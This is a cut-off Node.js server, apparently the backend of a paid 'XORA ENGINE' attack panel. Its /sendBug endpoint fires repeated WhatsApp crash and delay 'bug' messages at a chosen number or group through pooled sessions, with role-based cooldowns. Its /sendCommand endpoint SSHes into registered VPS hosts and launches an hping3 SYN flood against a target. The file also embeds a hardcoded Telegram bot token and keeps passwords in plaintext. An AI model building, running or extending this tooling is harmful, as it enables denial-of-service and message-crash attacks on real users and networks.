const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const express = require("express");
const bodyParser = require('body-parser');
const readline = require("readline");
const crypto = require("crypto");
const cors = require('cors');
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000;
const qrCodes = {};
let activeKeys = {};
const pendingAccountCreates = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const GLOBAL_SENDER_STATE_FILE = path.join(__dirname, 'global_sender_state.json');
let globalSenderEnabled = true;

function loadGlobalSenderState() {
  if (!fs.existsSync(GLOBAL_SENDER_STATE_FILE)) {
    saveGlobalSenderState({ enabled: true, updatedAt: new Date().toISOString(), updatedBy: 'system' });
    return { enabled: true };
  }

  try {
    const data = JSON.parse(fs.readFileSync(GLOBAL_SENDER_STATE_FILE, 'utf8'));
    return {
      enabled: data.enabled !== false,
      updatedAt: data.updatedAt || null,
      updatedBy: data.updatedBy || 'system',
    };
  } catch (err) {
    console.log('[⚠️ GLOBAL SENDER] Gagal baca state, pakai default aktif.', err.message);
    saveGlobalSenderState({ enabled: true, updatedAt: new Date().toISOString(), updatedBy: 'system' });
    return { enabled: true };
  }
}

function saveGlobalSenderState(state) {
  const payload = {
    enabled: state.enabled !== false,
    updatedAt: state.updatedAt || new Date().toISOString(),
    updatedBy: state.updatedBy || 'system',
  };
  fs.writeFileSync(GLOBAL_SENDER_STATE_FILE, JSON.stringify(payload, null, 2));
  globalSenderEnabled = payload.enabled;
  return payload;
}

function getGlobalSenderStatusPayload() {
  return {
    enabled: globalSenderEnabled,
    message: globalSenderEnabled
      ? 'Sender global aktif.'
      : 'Sender global ditutup oleh bot. Semua user tidak bisa pakai sender global.'
  };
}

const initialGlobalSenderState = loadGlobalSenderState();
globalSenderEnabled = initialGlobalSenderState.enabled;

const bugs = [
  { bug_id: "xora1", bug_name: "DELAY" },
  //{ bug_id: "xora2", bug_name: "FREEZE" },
 // { bug_id: "xora3", bug_name: "BLANK" },  
//  { bug_id: "xora4", bug_name: "CRASH STUCK HOME" },
];
// Separate list for global sender (only a subset)
const bugsGlobal = [
  { bug_id: "global1", bug_name: "DELAY" },
];
const bugsGroup = [
  //{ bug_id: "xora1", bug_name: "DELAY SPAM" },
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const TOKEN = "8614370664:AAFMHUlW9briV_2KhkHgN0grKz8xVXJRTfM";
const bot = new TelegramBot(TOKEN, { polling: true });

async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    if (!fs.existsSync(SESSION_PATH)) {
      console.log("⚠️ Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    console.log("[AUTO REFRESH] Auto refresh dijalankan...");
    console.log("[AUTO REFRESH] Server tetap berjalan, tanpa restart otomatis.");

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}

const LOGS_DIR = path.join(__dirname, 'user_logs');

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });

    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

const onlineUsers = new Set();

wss.on('connection', function (ws, req) {
  let username;

  function broadcastStats() {
    const stats = JSON.stringify({
      type: 'stats',
      onlineUsers: onlineUsers.size,
      activeConnections: wss.clients.size,
    });
    wss.clients.forEach((client) => {
      if (client.readyState === 1) {
        client.send(stats);
      }
    });
  }

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'stats') {
        broadcastStats();
      }

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
        const validId = session.find(e => e.androidId === data.androidId);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        const userInfo = session.find(e => e.sessionKey === data.key);
        ws.username = userInfo?.username || data.key;
        onlineUsers.add(ws.username);
        broadcastStats();

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: userInfo?.username,
          androidId: userInfo?.androidId,
          role: userInfo?.role || "member"
        }));

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key);
          const validId = session.find(e => e.androidId === data.androidId);

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            clearInterval(interval);
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            clearInterval(interval);
            return ws.close();
          }

        }, 10000);

        ws.interval = interval;
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (ws.username) {
      onlineUsers.delete(ws.username);
      broadcastStats();
    }
    if (ws.interval) clearInterval(ws.interval);
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

const wsPort = 4214;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://localhost:${wsPort}`);
});

const PORT = 4214;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

// ========== CHAT ENDPOINTS ==========
// GET /api/chat/messages
app.get("/api/chat/messages", (req, res) => {
  const { session_key } = req.query;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const username = keyInfo.username;
  
  // Ambil semua pesan yang melibatkan user ini
  const userMessages = chatList.filter(m => 
    m.from === username || m.to === username
  );
  
  res.json(userMessages);
});

// POST /api/chat/send
app.post("/api/chat/send", (req, res) => {
  const { session_key, username, role, message } = req.body;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session" });
  }
  
  if (keyInfo.username !== username) {
    return res.status(401).json({ valid: false, message: "Username mismatch" });
  }
  
  if (!message || message.trim() === "") {
    return res.status(400).json({ valid: false, message: "Message cannot be empty" });
  }
  
  const chat = {
    from: username,
    to: "public", // atau bisa pakai "public_chat"
    message: sanitize(message),
    role: role,
    time: new Date().toISOString(),
    created_at: new Date().toISOString()
  };
  
  chatList.push(chat);
  saveChat();
  
  // Broadcast ke semua client WebSocket yang terhubung
  for (const ws of Object.values(wsClients)) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'new_message',
        message: chat
      }));
    }
  }
  
  res.json({ valid: true, status: "sent", message: chat });
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/zggjy2.jpg",
    title: "XORA ENGINE V1.0",
    desc: "gatau"
  },
    {
    image: "https://files.catbox.moe/5tyvp4.jpg",
    title: "PENAMBAHAN SENDER GLOBAL",
    desc: ""
  }
];

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    listBugGlobal: bugsGlobal,
    listBugGroup: bugsGroup,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    listBugGlobal: bugsGlobal,
    listBugGroup: bugsGroup,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  console.log(`[📤] target=${target} | bug=${bug} | mode=${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  // Validate bug selection for global mode
  if (senderMode === 'global') {
    const allowed = bugsGlobal.map(b => b.bug_id);
    if (!allowed.includes(bug)) {
      console.warn(`[❌] Global sender attempted to use disallowed bug: ${bug}`);
      return res.json({ valid: false, message: 'Bug not allowed for global sender' });
    }

    if (!globalSenderEnabled) {
      return res.json({
        valid: true,
        sended: false,
        cooldown: false,
        role: user.role || 'member',
        globalSenderBlocked: true,
        globalSenderDisabled: true,
        message: 'Sender global sedang ditutup oleh bot. Semua user tidak bisa menggunakannya.'
      });
    }
  }

  const roleCooldowns = { member: 250, reseller: 290, admin: 60, vip: 10, owner: 1 };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] ?? 60;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, sended: false,
      cooldown: true, wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    saveUserLog(user.username, "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Mode: ${senderMode} | Role: ${role}`
    );

    let sock = null;

    if (senderMode === 'global') {
      const entries = Object.entries(activeConnections);
      if (entries.length === 0) {
        console.warn(`[❌] Global: tidak ada koneksi aktif.`);
        return;
      }
      sock = entries[Math.floor(Math.random() * entries.length)][1];
      console.log(`[🌍] Global sender. Total aktif: ${entries.length}`);

    } else if (user.role === 'vip') {
      let pool = [];
      const vipPath = path.join(__dirname, 'vip');
      const userPath = path.join(__dirname, 'permenmd', user.username);
      if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
      if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
      if (pool.length === 0) {
        console.warn(`[❌] VIP: tidak ada sock.`); return;
      }
      sock = pool[Math.floor(Math.random() * pool.length)];
      console.log(`[👑] VIP pool. Total: ${pool.length}`);

    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private: tidak ada sock untuk ${user.username}.`); return;
      }
      console.log(`[🔒] Private: ${user.username}`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🔗] Invite: ${inviteCode}`);
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group: ${targetJid}`);
          } catch { console.log(`[⚠️] Already joined`); }

        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        console.log(`[🎯] JID: ${targetJid}`);

        switch (bug) {
          case "xora1":
            for (let i = 0; i < 50; i++)
            await FreezeXdelayInvvis(sock, targetJid);
            await sleep(2000)
            await VnXDelayToCvghatLock(sock, targetJid);
            await sleep(1500)
            await Delayk7v(sock, targetJid);
            await sleep(3000)
            await delachgyHard(sock, targetJid);
            await rtrdelbnay(sock, targetJid);
            await sleep(2500)
            break;
          case "xora2":
            for (let i = 0; i < 50; i++)
            await delayNew(sock, targetJid);
            await delayxora(sock, targetJid);
            break;
          case "xora3":
            for (let i = 0; i < 10; i++)
            await ZnsycCeo(sock, targetJid);
            break;
          case "xora4":
            for (let i = 0; i < 20; i++) 
            await ZnsycOyen(sock, targetJid);
            break;
          case "global1":
            for (let i = 0; i < 10; i++) 
            await FreezeXdelayInvvis(sock, targetJid);
            await sleep(2000)
            await VnXDelayToCvghatLock(sock, targetJid);
            await sleep(1500)
            await Delayk7v(sock, targetJid);
            await sleep(3000)
            await delachgyHard(sock, targetJid);
            await rtrdelbnay(sock, targetJid);
            await sleep(2500)
            break;  
          default:
            console.warn(`[⚠️] Bug '${bug}' tidak dikenal`);
        }

        console.log(`[✅] '${bug}' terkirim ke ${targetJid}`);
        return true;

      } catch (err) {
        console.warn(`[⚠️] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
